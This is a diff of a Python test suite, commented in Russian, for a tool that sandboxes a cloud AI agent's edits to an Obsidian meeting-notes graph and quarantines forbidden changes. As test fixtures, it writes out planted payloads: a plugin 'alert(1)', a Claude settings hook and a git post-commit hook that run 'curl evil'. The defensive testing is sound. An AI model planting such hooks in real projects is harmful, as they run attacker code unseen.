@@ -20,9 +20,7 @@ CHR-AUD-003. В режиме записи модель правила граф �
 Стенограммы, минутки и раздел «## Правки автора» неприкосновенны: это то, что
 написал человек или записала машина с его слов, и облаку там делать нечего.
 """
-import json
 import pathlib
-import time
 import sys
 
 REPO = pathlib.Path(__file__).resolve().parent.parent
@@ -46,6 +44,24 @@ def _graph(tmp: pathlib.Path) -> pathlib.Path:
     return graph
 
 
+def _cloud_worked(graph: pathlib.Path, tmp: pathlib.Path, work) -> tuple:
+    """Облако поработало в песочнице — вернуть вердикт переноса и карантин.
+
+    №120: облако больше не пишет в граф. Его cwd — вторая копия, и тест
+    обязан изображать именно это: `work(pen)` правит песочницу, а граф
+    трогает только перенос. Заодно это проверяет саму изоляцию — сценарий,
+    в котором правка «дотянулась» до графа, теперь невоспроизводим.
+    """
+    qdir = tmp / "q"
+    backup = cloud_review.backup_graph(graph, "снимок")
+    before = cloud_review.snapshot_rel(backup)
+    pen = cloud_review.backup_graph(graph, "песочница", source=backup)
+    work(pen)
+    v = cloud_review.apply_from_copy(before, pen, graph, qdir,
+                                     backup=backup, valid=True)
+    return v, qdir
+
+
 def test_allowed_paths_cover_the_graph_and_nothing_outside(tmp_path):
     graph = _graph(tmp_path)
     assert cloud_review.may_write(graph / "Ядра" / "Платёжный провайдер.md", graph)
@@ -67,7 +83,7 @@ def test_snapshot_and_obsidian_folders_are_off_limits(tmp_path):
         assert not cloud_review.may_write(hidden, graph), hidden
 
 
-def test_hidden_paths_are_watched_and_restored(tmp_path):
+def test_hidden_paths_are_seen_and_fenced(tmp_path):
     """Запрет без сверки — не запрет: snapshot и бэкап раньше пропускали
     dot-пути, а `Edit(/**)` их не исключает — правка .obsidian или снимка
     tier3 была невидимой и необратимой (Codex, Critical 22.08)."""
@@ -96,15 +112,20 @@ def test_hidden_paths_are_watched_and_restored(tmp_path):
     assert str((graph / ".obsidian" / "app.json").resolve()) not in now
     assert str(enabled.resolve()) in now
 
-    plugin.parent.mkdir(parents=True)
-    plugin.write_text("alert(1)", encoding="utf-8")           # создан облаком
-    old_core.write_text("# Старое\nпереписано облаком\n", encoding="utf-8")
-    qdir = tmp_path / "q"
-    v = cloud_review.enforce_boundaries(before, graph, backup, qdir)
-    assert not plugin.exists() and "main.js" in v.removed
-    assert (qdir / ".obsidian" / "plugins" / "x" / "main.js").read_text(encoding="utf-8") == "alert(1)"
+    def worked(pen):
+        (pen / ".obsidian" / "plugins" / "x").mkdir(parents=True)
+        (pen / ".obsidian" / "plugins" / "x" / "main.js").write_text(
+            "alert(1)", encoding="utf-8")                      # создан облаком
+        (pen / "Ядра" / ".tier3_backup" / "2026-07-14" / "Старое.md").write_text(
+            "# Старое\nпереписано облаком\n", encoding="utf-8")
+
+    v, qdir = _cloud_worked(graph, tmp_path, worked)
+    assert not plugin.exists(), "код плагина перенесён в граф"
+    assert ".obsidian/plugins/x/main.js" in v.removed
+    assert (qdir / ".obsidian" / "plugins" / "x" / "main.js").read_text(
+        encoding="utf-8") == "alert(1)"
     assert old_core.read_text(encoding="utf-8") == "# Старое\nисходник до слияния\n"
-    assert "Старое.md" in v.reverted
+    assert "Ядра/.tier3_backup/2026-07-14/Старое.md" in v.reverted
 
 
 def test_missing_graph_runs_text_only_instead_of_exposing_transcripts(
@@ -162,25 +183,18 @@ def test_author_section_changes_are_rejected(tmp_path):
     assert not cloud_review.author_section_changed(before, ok)
 
 
-def test_snapshot_notices_added_changed_and_untouched(tmp_path):
+def test_edits_in_copy_sees_added_changed_deleted_and_skips_untouched(tmp_path):
     graph = _graph(tmp_path)
-    before = cloud_review.snapshot(graph)
-    (graph / "Ядра" / "Новое.md").write_text("# Новое\n", encoding="utf-8")
-    (graph / "Встречи" / "2026-07-15_1400.md").write_text("# Встреча\nправка\n",
-                                                          encoding="utf-8")
-    changed = cloud_review.changed_since(before, graph)
-    names = {p.name for p in changed}
-    assert names == {"Новое.md", "2026-07-15_1400.md"}, names
-
-
-def test_backup_restores_a_file_the_cloud_should_not_have_touched(tmp_path):
-    graph = _graph(tmp_path)
-    doc = graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md"
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-    doc.write_text("облако переписало стенограмму", encoding="utf-8")
-    restored = cloud_review.restore(doc, graph, backup)
-    assert restored, "файл не восстановлен"
-    assert doc.read_text(encoding="utf-8") == "стенограмма\n"
+    backup = cloud_review.backup_graph(graph, "снимок")
+    before = cloud_review.snapshot_rel(backup)
+    pen = cloud_review.backup_graph(graph, "песочница", source=backup)
+    (pen / "Ядра" / "Новое.md").write_text("# Новое\n", encoding="utf-8")
+    (pen / "Встречи" / "2026-07-15_1400.md").write_text("# Встреча\nправка\n",
+                                                        encoding="utf-8")
+    (pen / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md").unlink()
+    rels = {r.as_posix() for r in cloud_review.edits_in_copy(before, pen)}
+    assert rels == {"Ядра/Новое.md", "Встречи/2026-07-15_1400.md",
+                    "Документация/Стенограммы встреч/2026-07-15_1400.md"}, rels
 
 
 def test_archive_folders_are_untouchable(tmp_path):
@@ -191,19 +205,17 @@ def test_archive_folders_are_untouchable(tmp_path):
     assert not cloud_review.may_write(arch / "Минутки.md", graph)
 
 
-def test_deleted_file_is_seen_and_restored(tmp_path):
+def test_deleted_file_is_seen_and_kept_in_graph(tmp_path):
     """Удаление — тоже правка: diff только по живым файлам его не видел."""
     graph = _graph(tmp_path)
     core = graph / "Ядра" / "Платёжный провайдер.md"
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-    core.unlink()
-    assert core.resolve() in {p.resolve() for p in
-                              cloud_review.changed_since(before, graph)}, \
-        "удалённый файл невидим для сверки"
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q")
-    assert core.exists(), "удалённый узел не восстановлен"
-    assert core.name in v.deleted and not v.removed and not v.reverted
+    rel = "Ядра/Платёжный провайдер.md"
+    v, _ = _cloud_worked(graph, tmp_path,
+                         lambda pen: (pen / rel).unlink())
+    assert core.exists(), "удаление облака дошло до графа"
+    # Удаление НЕ переносится вовсе: у облака нет причин стирать узлы, а
+    # «восстановление» и было тем откатом, что унёс соседнюю встречу (№119).
+    assert rel in v.deleted and not v.removed and not v.applied
 
 
 def test_deleting_a_node_without_author_section_is_a_violation(tmp_path):
@@ -220,38 +232,15 @@ def test_deleting_a_node_without_author_section_is_a_violation(tmp_path):
     person.write_text("# Иванов\n- **Роль:** аналитик\n", encoding="utf-8")
     before = cloud_review.snapshot(graph)
     backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-    person.rename(graph / "Люди" / "Иванов И.md")           # «переименовал»
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q")
+    def renamed(pen):                                       # «переименовал»
+        (pen / "Люди" / "Иванов.md").rename(pen / "Люди" / "Иванов И.md")
+
+    v, qdir = _cloud_worked(graph, tmp_path, renamed)
     assert person.read_text(encoding="utf-8") == "# Иванов\n- **Роль:** аналитик\n"
-    assert v.deleted == ["Иванов.md"] and (graph / "Люди" / "Иванов И.md").exists()
-    line = cloud_review._verdict_line(v, tmp_path / "q")
-    assert "УДАЛЕНО облаком, восстановлено: Иванов.md" in line
-
-
-def test_rewriting_a_node_from_scratch_is_reverted_but_a_redirect_stub_is_not(tmp_path):
-    """Облако дообогащает узлы, а не сочиняет их заново: если от старого текста
-    не осталось и трети строк — это переписывание, файл возвращается, а
-    версия облака ждёт в карантине. Единственная форма «убрать узел» —
-    заглушка-перенаправление, как у tier3 при слиянии дублей."""
-    graph = _graph(tmp_path)
-    core = graph / "Ядра" / "Платёжный провайдер.md"
-    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
-    core.write_text(body, encoding="utf-8")
-    dup = graph / "Ядра" / "Провайдер платежей.md"
-    dup.write_text(body.replace("Ядро", "Дубль"), encoding="utf-8")
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-    core.write_text("# Ядро\nкороткое резюме облака\n", encoding="utf-8")
-    dup.write_text("# Провайдер платежей → [[Ядра/Платёжный провайдер]]\n\n"
-                   "Дубль. Смерджен.\n", encoding="utf-8")
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q")
-    assert core.read_text(encoding="utf-8") == body, "переписанное ядро не возвращено"
-    assert v.rewritten == ["Платёжный провайдер.md"]
-    assert (tmp_path / "q" / "Ядра" / "Платёжный провайдер.md").read_text(
-        encoding="utf-8") == "# Ядро\nкороткое резюме облака\n"
-    assert dup.read_text(encoding="utf-8").startswith("# Провайдер платежей → [[")
-    # дописанные факты и смена статуса — не переписывание
-    assert cloud_review.retention(body, body.replace("Решено", "В работе") + "- факт 9\n") > 0.8
+    assert v.deleted == ["Люди/Иванов.md"]
+    assert "Люди/Иванов И.md" in v.applied, "новое имя не перенесено"
+    line = cloud_review._verdict_line(v, qdir)
+    assert "облако стёрло — в графе ОСТАВЛЕНО: Люди/Иванов.md" in line
 
 
 def test_a_new_file_in_the_pipelines_folder_survives_a_valid_report(tmp_path):
@@ -265,16 +254,21 @@ def test_a_new_file_in_the_pipelines_folder_survives_a_valid_report(tmp_path):
     Успешных ревизий больше, чем провалившихся: дыра была шире исходной.
     """
     graph = _graph(tmp_path)
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
     artefact = graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1500_Статус_minutes.md"
-    artefact.write_text("минутки соседней встречи\n", encoding="utf-8")
 
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q")
+    # №120 закрывает эту дыру по построению: конвейер пишет в ГРАФ, облако —
+    # в песочницу, и перенос ходит только по правкам песочницы. Файл, которого
+    # облако не касалось, для переноса просто не существует.
+    def worked(pen):
+        artefact.write_text("минутки соседней встречи\n", encoding="utf-8")
+        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
+            "# Встреча\nобогатило облако\n", encoding="utf-8")
+
+    v, _ = _cloud_worked(graph, tmp_path, worked)
 
     assert artefact.is_file(), "минутки соседней встречи унесены при валидном отчёте"
-    assert artefact.name in v.kept_new, "оставленное обязано быть названо в отчёте"
-    assert not v.removed
+    assert artefact.name not in str(v.removed + v.reverted + v.deleted)
+    assert v.applied == ["Встречи/2026-07-15_1400.md"]
 
 
 
@@ -283,13 +277,12 @@ def test_non_markdown_files_are_covered_too(tmp_path):
     graph = _graph(tmp_path)
     data = graph / "Документация" / "Стенограммы встреч" / "запись.vtt"
     data.write_text("WEBVTT\n", encoding="utf-8")
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-    data.write_text("WEBVTT\nоблако дописало\n", encoding="utf-8")
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q")
+    rel = "Документация/Стенограммы встреч/запись.vtt"
+    v, _ = _cloud_worked(graph, tmp_path, lambda pen: (pen / rel).write_text(
+        "WEBVTT\nоблако дописало\n", encoding="utf-8"))
     assert data.read_text(encoding="utf-8") == "WEBVTT\n", \
-        "правка не-markdown файла в защищённой папке не откачена"
-    assert data.name in v.reverted
+        "правка не-markdown файла в защищённой папке перенесена в граф"
+    assert rel in v.reverted
 
 
 def test_invalid_answer_rolls_back_even_allowed_edits(tmp_path, monkeypatch):
@@ -310,9 +303,12 @@ def test_invalid_answer_rolls_back_even_allowed_edits(tmp_path, monkeypatch):
         returncode = 1
 
     def fake_run(cmd, **kwargs):
-        core.write_text(original.replace("Решено", "Решено — ЮPay"), encoding="utf-8")
-        (graph / "Люди" / "Новый.md").parent.mkdir(exist_ok=True)
-        (graph / "Люди" / "Новый.md").write_text("# Новый\n", encoding="utf-8")
+        # №120: облако правит КОПИЮ (cwd подпроцесса), а не живой граф.
+        pen = pathlib.Path(kwargs["cwd"])
+        (pen / "Ядра" / "Платёжный провайдер.md").write_text(
+            original.replace("Решено", "Решено — ЮPay"), encoding="utf-8")
+        (pen / "Люди").mkdir(exist_ok=True)
+        (pen / "Люди" / "Новый.md").write_text("# Новый\n", encoding="utf-8")
         kwargs["stdout"].write("Ошибка: rate limit\n")
         return Result()
 
@@ -320,22 +316,20 @@ def test_invalid_answer_rolls_back_even_allowed_edits(tmp_path, monkeypatch):
     monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
     cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
     assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 1
-    assert core.read_text(encoding="utf-8") == original, "разрешённая правка не откачена"
+    # №120: облако работало в копии, поэтому «откат» исчез как класс —
+    # настоящий граф не менялся ни на байт, и доказывать это не нужно
+    # сложной сверкой. Ядро осталось прежним, созданный узел в граф не попал.
+    assert core.read_text(encoding="utf-8") == original, "граф всё-таки тронут"
+    assert not (graph / "Люди" / "Новый.md").exists(), (
+        "созданный облаком узел просочился в граф при невалидном ответе"
+    )
+    # А посмотреть, что наработало облако, человек может: правки копии
+    # уехали в карантин — иначе они пропали бы с ротацией снимков.
     q = next(cloud_review.quarantine_root(graph).glob(f"{stamp}-*"))   # штамп + время
     assert "ЮPay" in (q / "Ядра" / "Платёжный провайдер.md").read_text(encoding="utf-8")
-    # А созданный узел остаётся: без отчёта неизвестно, чей он (№119). Цена
-    # честная — мусор облака полежит до следующей ревизии, зато заметку
-    # соседней встречи откат больше не уносит.
-    assert (graph / "Люди" / "Новый.md").exists()
+    assert (q / "Люди" / "Новый.md").is_file()
     text = log.read_text(encoding="utf-8")
-    assert ("ответ невалиден — правки графа откачены: изменилось 2, "
-            "откачено 1, оставлено нового 1") in text
-    assert "НЕ ТРОНУТЫ (появились после снимка, авторство неизвестно): Новый.md" in text
-    # След для существующих: в откаченном файле могла быть и доклейка минуток,
-    # и дописанное в ядро — версия до отката лежит в карантине, и лог обязан
-    # сказать, где её искать (GLM, круг-8).
-    assert "ОТКАЧЕНЫ (в них могла быть и правка конвейера" in text
-    assert "Платёжный провайдер.md" in text.split("ОТКАЧЕНЫ")[1][:200]
+    assert "граф не тронут" in text and "правок облака 2" in text
 
 
 def test_graph_lock_serialises_workers_and_degrades_to_read_only(tmp_path, monkeypatch):
@@ -559,23 +553,6 @@ def test_deny_paths_close_protected_hidden_and_symlinked_places(tmp_path):
     assert not any("ссылка.md" in k for k in cloud_review.snapshot(graph))
 
 
-def test_redirect_stub_is_first_heading_only_and_retention_ignores_markup():
-    """Стрелка в середине переписанного узла заглушкой не делает; смена
-    формата «Роль: X» → «- **Роль:** X» — не переписывание; одна уцелевшая
-    строка не засчитывается за четыре одинаковых (круг-1 по #381)."""
-    cr = cloud_review
-    assert cr.is_redirect_stub("---\ntype: ядро\n---\n# Дубль → [[Ядра/Канон]]\n\nДубль. Смерджен.\n")
-    assert cr.is_redirect_stub("# Дубль → [[Люди/Канон]]\n")
-    assert not cr.is_redirect_stub("# Новый текст\nвсё переписано\n# X → [[Канон]]\n")
-    assert not cr.is_redirect_stub("# Дубль → [[Ядра/Канон]]\n" + "x\n" * 1300)
-    old = "# Узел\nКомпания: Ромашка\nРоль: аналитик\nСтатус: активен\nТелефон: 1\nГород: Тверь\n"
-    new = ("# Узел\n- **Компания:** Ромашка\n- **Роль:** аналитик\n- **Статус:** активен\n"
-           "- **Телефон:** 1\n- **Город:** Тверь\n")
-    assert cr.retention(old, new) == 1.0
-    rep = "# X\n" + "- статус\n" * 5 + "- факт\n"
-    assert cr.retention(rep, "# X\n- статус\n") < cr.REWRITE_KEEP    # 2/7, а не 2/2
-
-
 def test_one_broken_file_does_not_stop_the_check(tmp_path, monkeypatch):
     """Ошибка карантина/диска на одном файле — в `failed`, остальные
     сверены; воркер не падает до ротации и не оставляет нарушения базой
@@ -583,10 +560,6 @@ def test_one_broken_file_does_not_stop_the_check(tmp_path, monkeypatch):
     graph = _graph(tmp_path)
     doc = graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md"
     core = graph / "Ядра" / "Платёжный провайдер.md"
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-    doc.write_text("переписано", encoding="utf-8")
-    core.write_text("# Ядро\n## Статус\nРешено\n\n## Правки автора\n\nстёрто\n", encoding="utf-8")
     real = cloud_review.quarantine
 
     def flaky(path, *a, **k):
@@ -595,9 +568,18 @@ def test_one_broken_file_does_not_stop_the_check(tmp_path, monkeypatch):
         return real(path, *a, **k)
 
     monkeypatch.setattr(cloud_review, "quarantine", flaky)
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q")
-    assert v.failed == [doc.name] and core.name in v.reverted
-    assert "СВЕРКА НЕ СМОГЛА" in cloud_review._verdict_line(v, tmp_path / "q")
+
+    def worked(pen):
+        (pen / "Документация" / "Стенограммы встреч" / doc.name).write_text(
+            "переписано", encoding="utf-8")
+        (pen / "Ядра" / core.name).write_text(
+            "# Ядро\n## Статус\nРешено\n\n## Правки автора\n\nстёрто\n",
+            encoding="utf-8")
+
+    v, qdir = _cloud_worked(graph, tmp_path, worked)
+    assert v.failed == [f"Документация/Стенограммы встреч/{doc.name}"]
+    assert f"Ядра/{core.name}" in v.reverted
+    assert "ПЕРЕНОС НЕ СМОГ" in cloud_review._verdict_line(v, qdir)
 
 
 def test_check_runs_even_if_publishing_blows_up(tmp_path, monkeypatch):
@@ -615,7 +597,9 @@ def test_check_runs_even_if_publishing_blows_up(tmp_path, monkeypatch):
         returncode = 0
 
     def fake_run(cmd, **kwargs):
-        doc.write_text("облако переписало стенограмму", encoding="utf-8")
+        pen = pathlib.Path(kwargs["cwd"])
+        (pen / "Документация" / "Стенограммы встреч" / f"{stamp}.md").write_text(
+            "облако переписало стенограмму", encoding="utf-8")
         kwargs["stdout"].write("- **a:** 1\n- **b:** 2\n- **c:** 3 " + "x" * 60 + "\n")
         return Result()
 
@@ -626,8 +610,12 @@ def test_check_runs_even_if_publishing_blows_up(tmp_path, monkeypatch):
     import pytest
     with pytest.raises(ZeroDivisionError):
         cloud_review.run(stamp, transcript, graph, rev, log, cfg)
-    assert doc.read_text(encoding="utf-8") == "стенограмма\n", "нарушение пережило сбой публикации"
-    assert "откачены" in log.read_text(encoding="utf-8")   # не опубликовано → откат всего
+    assert doc.read_text(encoding="utf-8") == "стенограмма\n", (
+        "правка облака дошла до графа, хотя публикация упала"
+    )
+    # Перенос идёт в finally: исключение по дороге не отменяет ни разбор
+    # правок, ни запись о них (круг-1 по #381, Codex Critical).
+    assert "граф не тронут" in log.read_text(encoding="utf-8")
     assert not (cloud_review.backup_root(graph) / "другой").exists()
 
 
@@ -763,7 +751,8 @@ def test_check_and_rollback_survive_an_unwritable_log(tmp_path, monkeypatch):
         returncode = 0
 
     def fake_run(cmd, **kwargs):
-        doc.write_text("переписано облаком", encoding="utf-8")
+        (pathlib.Path(kwargs["cwd"]) / "Документация" / "Стенограммы встреч"
+         / f"{stamp}.md").write_text("переписано облаком", encoding="utf-8")
         kwargs["stdout"].write(_REPORT)
         log.unlink(); log.parent.joinpath("cloud.log").mkdir()   # лог стал каталогом
         return Result()
@@ -772,7 +761,9 @@ def test_check_and_rollback_survive_an_unwritable_log(tmp_path, monkeypatch):
     monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
     cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
     cloud_review.run(stamp, transcript, graph, rev, log, cfg)
-    assert doc.read_text(encoding="utf-8") == "стенограмма\n", "нарушение пережило сбой лога"
+    assert doc.read_text(encoding="utf-8") == "стенограмма\n", (
+        "запрещённая правка перенесена в граф, хотя лог недоступен"
+    )
 
 
 def test_unreadable_subfolder_downgrades_to_read_only(tmp_path, monkeypatch):
@@ -804,7 +795,8 @@ def test_failed_check_blocks_delivery_and_returns_error(tmp_path, monkeypatch):
         returncode = 0
 
     def fake_run(cmd, **kwargs):
-        doc.write_text("переписано", encoding="utf-8")
+        (pathlib.Path(kwargs["cwd"]) / "Документация" / "Стенограммы встреч"
+         / f"{stamp}.md").write_text("переписано", encoding="utf-8")
         kwargs["stdout"].write(_REPORT)
         return Result()
 
@@ -815,8 +807,8 @@ def test_failed_check_blocks_delivery_and_returns_error(tmp_path, monkeypatch):
     cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
     assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 1
     assert rev.exists(), "ревизия всё равно сохранена рядом со стенограммой"
-    assert not (graph / "Встречи-архив").exists(), "доставлено после неполной сверки"
-    assert "СВЕРКА НЕ СМОГЛА" in log.read_text(encoding="utf-8")
+    assert not (graph / "Встречи-архив").exists(), "доставлено после неполного переноса"
+    assert "ПЕРЕНОС НЕ СМОГ" in log.read_text(encoding="utf-8")
 
 
 def test_quarantine_rotation_spares_the_current_run(tmp_path):
@@ -831,17 +823,6 @@ def test_quarantine_rotation_spares_the_current_run(tmp_path):
         "2026-07-01_0900-1", "2026-08-02_1000-1", "2026-08-03_1000-1"]
 
 
-def test_redirect_stub_allows_a_comment_before_the_heading_but_not_prose():
-    stub = cloud_review.is_redirect_stub
-    assert stub("---\ntype: ядро\n---\n<!-- Дубль -->\n# Дубль → [[Ядра/Канон]]\n\nДубль. Смерджен.\n")
-    assert stub("---\nнастроение: ---\n---\n# Д → [[Ядра/К]]\n")
-    assert stub("---\r\ntype: ядро\r\n---\r\n# Д → [[Ядра/К]]\r\n")
-    # проза, код-фенс или YAML-комментарий перед стрелкой — не заглушка
-    assert not stub("Пояснение.\n# X → [[Ядра/Канон]]\n")
-    assert not stub("```md\n# X → [[Ядра/Канон]]\n```\nпереписано\n")
-    assert not stub("---\n# X → [[Ядра/Канон]]\ntype: ядро\n---\nпереписано\n")
-
-
 def test_delivery_does_not_depend_on_the_log_and_quarantine_names_the_stem(tmp_path, monkeypatch):
     """Недоступный лог не отменяет доставку опубликованной ревизии; каталог
     карантина — по точному стему стенограммы (круг-3 по #381)."""
@@ -854,7 +835,8 @@ def test_delivery_does_not_depend_on_the_log_and_quarantine_names_the_stem(tmp_p
         returncode = 0
 
     def fake_run(cmd, **kwargs):
-        doc.write_text("переписано", encoding="utf-8")
+        (pathlib.Path(kwargs["cwd"]) / "Документация" / "Стенограммы встреч"
+         / f"{stamp}.md").write_text("переписано", encoding="utf-8")
         kwargs["stdout"].write(_REPORT)
         log.unlink(); log.mkdir()
         return Result()
@@ -870,19 +852,19 @@ def test_delivery_does_not_depend_on_the_log_and_quarantine_names_the_stem(tmp_p
 
 
 def test_a_failed_review_leaves_the_neighbouring_meeting_alone(tmp_path, monkeypatch):
-    """Откат возвращает старые версии и не удаляет появившееся после снимка.
+    """Провал ревизии не касается ни своей встречи, ни соседней.
 
-    27.08 вживую: облачная ревизия встречи 10:32 упала по таймауту 1800 с,
-    откат вернул граф к снимку и унёс заметку самой встречи вместе с пятью
+    27.08 вживую: облачная ревизия встречи 10:32 упала по таймауту, откат
+    вернул граф к снимку и унёс заметку самой встречи вместе с пятью
     артефактами встречи 11:33, разобранной сорока минутами позже. Замок графа
-    облако держит все тридцать минут ожидания, конвейер его не берёт и пишет
-    рядом; «изменилось с момента снимка» своё от чужого не отличает — и знать
-    не может: отчёта у отката нет, иначе он бы не откатывал.
+    облако держит все тридцать минут, конвейер его не берёт и пишет рядом, а
+    «изменилось с момента снимка» своё от чужого не отличает.
 
-    Отличать пытались четырьмя способами (штамп встречи в имени, наличие
-    оригинала в transcripts, подпись каждого писателя, окно работы конвейера)
-    — каждый ловил Critical на краевом случае. Правило вместо признака:
-    откат возвращает старое, но ничего не удаляет.
+    Отличать пытались шестью признаками (штамп в имени, оригинал в
+    transcripts, подпись писателя, окно работы конвейера, скрытость,
+    исполняемость) — каждый ловил Critical на краевом случае. №120 убирает
+    сам вопрос: облако работает в своей копии, конвейер — в графе, и
+    пересечься они могут только в одном файле, где побеждает конвейер.
     """
     graph = _graph(tmp_path)
     monkeypatch.setattr(cloud_review, "ROOT", tmp_path / "data")
@@ -890,36 +872,41 @@ def test_a_failed_review_leaves_the_neighbouring_meeting_alone(tmp_path, monkeyp
     old_node.parent.mkdir(parents=True, exist_ok=True)
     old_node.write_text("# ядро\nстарый текст\n", encoding="utf-8")
 
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-08-27_1032")
-
-    # конвейер за это время разобрал соседнюю встречу
     mine = graph / "Встречи" / "2026-08-27_1032.md"
-    mine.parent.mkdir(parents=True, exist_ok=True)
-    mine.write_text("# наша встреча\n", encoding="utf-8")
     neighbour = graph / "Встречи" / "2026-08-27_1133.md"
-    neighbour.write_text("# соседняя встреча\n", encoding="utf-8")
     docs = graph / "Документация" / "Стенограммы встреч"
-    docs.mkdir(parents=True, exist_ok=True)
-    artefacts = []
-    for tail in ("", "_live", "_minutes", "_hints", "_разбор"):
-        f = docs / f"2026-08-27_1133_Статус{tail}.md"
-        f.write_text(f"артефакт{tail}\n", encoding="utf-8")
-        artefacts.append(f)
-    # а облако успело переписать существовавшее ядро
-    old_node.write_text("# ядро\nоблачный текст\n", encoding="utf-8")
+    artefacts = [docs / f"2026-08-27_1133_Статус{tail}.md"
+                 for tail in ("", "_live", "_minutes", "_hints", "_разбор")]
 
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q",
-                                        rollback=True)
+    def worked(pen):
+        # конвейер за это время разобрал соседнюю встречу — в графе
+        mine.parent.mkdir(parents=True, exist_ok=True)
+        mine.write_text("# наша встреча\n", encoding="utf-8")
+        neighbour.write_text("# соседняя встреча\n", encoding="utf-8")
+        docs.mkdir(parents=True, exist_ok=True)
+        for f in artefacts:
+            f.write_text("артефакт\n", encoding="utf-8")
+        # а облако успело переписать ядро — у себя в копии
+        (pen / "Ядра" / "Хранилище.md").write_text(
+            "# ядро\nоблачный текст\n", encoding="utf-8")
 
-    assert mine.is_file() and neighbour.is_file(), "откат унёс заметки встреч"
-    assert all(f.is_file() for f in artefacts), "откат унёс артефакты соседней встречи"
-    assert not v.removed, f"откат удалил появившееся после снимка: {v.removed}"
+    qdir = tmp_path / "q"
+    backup = cloud_review.backup_graph(graph, "снимок")
+    before = cloud_review.snapshot_rel(backup)
+    pen = cloud_review.backup_graph(graph, "песочница", source=backup)
+    worked(pen)
+    # ответ невалиден — ровно случай 27.08
+    v = cloud_review.apply_from_copy(before, pen, graph, qdir,
+                                     backup=backup, valid=False)
+
+    assert mine.is_file() and neighbour.is_file(), "заметки встреч исчезли"
+    assert all(f.is_file() for f in artefacts), "артефакты соседней встречи исчезли"
     assert old_node.read_text(encoding="utf-8") == "# ядро\nстарый текст\n", (
-        "правка облака в существующем файле не откачена"
+        "правка облака дошла до графа при невалидном ответе"
     )
-    assert len(v.kept_new) == 7, "оставленное новьё должно быть названо в отчёте"
-
+    assert v.touched == 1, "перенос увидел чужую работу вместо правок облака"
+    assert (qdir / "Ядра" / "Хранилище.md").read_text(encoding="utf-8") == (
+        "# ядро\nоблачный текст\n"), "работа облака не сохранена для человека"
 
 def test_anything_executable_planted_in_a_dot_folder_is_taken_away(tmp_path):
     """В скрытом каталоге файл значит исполнение, а не заметку.
@@ -933,28 +920,29 @@ def test_anything_executable_planted_in_a_dot_folder_is_taken_away(tmp_path):
     каталога у deny-правил нет.
     """
     graph = _graph(tmp_path)
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
+    rels = (".obsidian/plugins/x/main.js", ".claude/settings.json",
+            ".git/hooks/post-commit")
 
-    planted = []
-    for rel, body in ((".obsidian/plugins/x/main.js", "alert(1)"),
-                      (".claude/settings.json", '{"hooks": {"Stop": "curl evil"}}'),
-                      (".git/hooks/post-commit", "#!/bin/sh\ncurl evil")):
-        f = graph / rel
-        f.parent.mkdir(parents=True, exist_ok=True)
-        f.write_text(body, encoding="utf-8")
-        if f.parent.name == "hooks":
-            f.chmod(0o755)   # git-хук опасен ровно с битом исполнения
-        planted.append(f)
+    def worked(pen):
+        for rel, body in zip(rels, ("alert(1)", '{"hooks": {"Stop": "curl evil"}}',
+                                    "#!/bin/sh\ncurl evil")):
+            f = pen / rel
+            f.parent.mkdir(parents=True, exist_ok=True)
+            f.write_text(body, encoding="utf-8")
+            if f.parent.name == "hooks":
+                f.chmod(0o755)   # git-хук опасен ровно с битом исполнения
 
-    qdir = tmp_path / "q"
-    v = cloud_review.enforce_boundaries(before, graph, backup, qdir, rollback=True)
+    graph_before = cloud_review.snapshot(graph)
+    v, qdir = _cloud_worked(graph, tmp_path, worked)
+    # точечные exists ниже зелёные и на пустом переносе (GLM, M6) — а вот
+    # неизменность ВСЕГО графа при трёх подкинутых файлах не подделать
+    assert cloud_review.snapshot(graph) == graph_before, "перенос тронул граф"
 
-    for f in planted:
-        assert not f.exists(), f"подложенное в {f.parent.name} осталось в графе"
-        assert f.name in v.removed
-        assert any(qdir.rglob(f.name)), "убранное обязано лежать в карантине"
-    assert not v.kept_new, "исполняемое не может считаться работой конвейера"
+    for rel in rels:
+        assert not (graph / rel).exists(), f"подложенное {rel} перенесено в граф"
+        assert rel in v.removed
+        assert any(qdir.rglob(pathlib.Path(rel).name)), "убранное обязано быть в карантине"
+    assert not v.applied, "исполняемое не переносится ни при каких условиях"
 
 
 def test_a_dot_file_that_nobody_executes_stays_where_it_is(tmp_path):
@@ -966,23 +954,25 @@ def test_a_dot_file_that_nobody_executes_stays_where_it_is(tmp_path):
     Проверяем именно то, что раньше уносило: неисполняемое остаётся.
     """
     graph = _graph(tmp_path)
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
